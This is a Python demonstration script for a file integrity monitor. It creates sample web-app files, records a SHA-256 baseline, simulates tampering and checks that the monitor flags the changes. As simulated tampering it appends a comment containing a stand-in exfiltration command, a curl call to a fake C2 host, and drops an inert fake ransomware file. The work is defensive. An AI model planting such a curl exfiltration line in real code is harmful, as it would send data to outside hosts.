#!/usr/bin/env python3
"""
Automated live demonstration script for File Integrity Monitor (FIM).
Simulates an enterprise web app directory, establishes baseline,
simulates adversary tampering actions, and verifies alerts.
"""

import os
import sys
import time
import shutil
import tempfile
import subprocess
from pathlib import Path

# Paths
ROOT_DIR = Path(__file__).parent.resolve()
FIM_SCRIPT = ROOT_DIR / "fim" / "fim.py"

def step(title: str):
    print(f"\n\033[1;36m{'='*60}\033[0m")
    print(f"\033[1;33m[DEMO STEP] {title}\033[0m")
    print(f"\033[1;36m{'='*60}\033[0m\n")
    time.sleep(0.8)

def main():
    demo_dir = Path("/tmp/fim_production_demo")
    baseline_file = ROOT_DIR / "demo_baseline.json"
    alert_log = ROOT_DIR / "demo_alerts.json"

    # Clean previous demo state
    if demo_dir.exists():
        shutil.rmtree(demo_dir)
    if baseline_file.exists():
        baseline_file.unlink()
    if alert_log.exists():
        alert_log.unlink()

    demo_dir.mkdir(parents=True)

    try:
        step("1. Setting up Simulated Production Environment")
        (demo_dir / "index.html").write_text("<html><body>Welcome to Enterprise Portal</body></html>\n")
        (demo_dir / "app.py").write_text("import os\nprint('Serving verified API requests...')\n")
        (demo_dir / "database.cfg").write_text("DB_HOST=10.0.0.12\nDB_PORT=5432\nDB_SSL=True\n")
        
        print("Created sample assets in /tmp/fim_production_demo:")
        for f in demo_dir.glob("*"):
            print(f"  - {f.name} ({f.stat().st_size} bytes)")

        step("2. Initializing FIM Cryptographic Baseline (SHA-256)")
        cmd_init = [
            sys.executable, str(FIM_SCRIPT),
            "--init-baseline",
            "-t", str(demo_dir),
            "-b", str(baseline_file),
            "-w", "4"
        ]
        subprocess.run(cmd_init, check=True)

        step("3. Performing Immediate Integrity Audit (Expected: 100% Clean)")
        cmd_verify = [
            sys.executable, str(FIM_SCRIPT),
            "--verify",
            "-t", str(demo_dir),
            "-b", str(baseline_file),
            "-o", str(alert_log),
            "-v"
        ]
        subprocess.run(cmd_verify)

        step("4. Simulating Malicious Tampering & Intrusion Events")
        print("\033[1;31m[!] Adversary Actions Simulated:\033[0m")
        # 1. Modify app.py (Backdoor injection)
        print("  1. Injecting webshell/backdoor into app.py...")
        with open(demo_dir / "app.py", "a") as f:
            f.write("# Injected Backdoor: os.system('curl http://malicious.c2/exfil')\n")

        # 2. Add unauthorized file (Trojan)
        print("  2. Dropping unauthorized ransomware payload (ransomware.py)...")
        (demo_dir / "ransomware.py").write_text("print('All your files are encrypted!')\n")

        # 3. Delete database.cfg (Data destruction / Sabotage)
        print("  3. Deleting critical configuration file (database.cfg)...")
        (demo_dir / "database.cfg").unlink()

        step("5. Running FIM Detection Audit Against Established Baseline")
        ret = subprocess.run(cmd_verify)
        print(f"\nProcess Exit Code: {ret.returncode} (1 indicates integrity breach detected)")

        step("6. Inspecting Persisted Structured JSON Audit Alert Log")
        if alert_log.exists():
            print(f"\033[1;32mAlert log written to: {alert_log}\033[0m\n")
            print(alert_log.read_text())
        else:
            print("No alert log found.")

        step("7. Demo Completed Successfully!")
        print("\033[1;32mAll integrity breaches (CREATED, MODIFIED, DELETED) detected and logged.\033[0m\n")

    finally:
        # Cleanup demo workspace
        if demo_dir.exists():
            shutil.rmtree(demo_dir, ignore_errors=True)

if __name__ == "__main__":
    main()
